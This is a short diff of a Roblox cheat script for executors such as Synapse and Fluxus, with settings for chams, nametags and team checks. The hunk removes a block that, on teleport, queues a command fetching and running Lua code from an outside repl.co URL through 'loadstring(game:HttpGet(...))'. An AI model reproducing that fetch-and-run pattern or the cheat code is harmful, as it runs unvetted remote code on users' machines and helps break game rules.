@@ -28,14 +28,6 @@ local ChamsColor, RainbowChams = Color3.fromRGB(255, 255, 255), false;
 local Nametags = false;
 local TeamCheck = false;
 
-local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
-Player.OnTeleport:Connect(function(state)
-    --print(state, queueteleport)
-    if state == Enum.TeleportState.InProgress and queueteleport then 
-        queueteleport("loadstring(game:HttpGet('https://fffff--kiilllll1000x00.repl.co/gameLoader.lua'))()")
-    end 
-end)
-
 local s_rs = game:GetService("RunService")
 local l_plr = game:GetService("Players").LocalPlayer
 
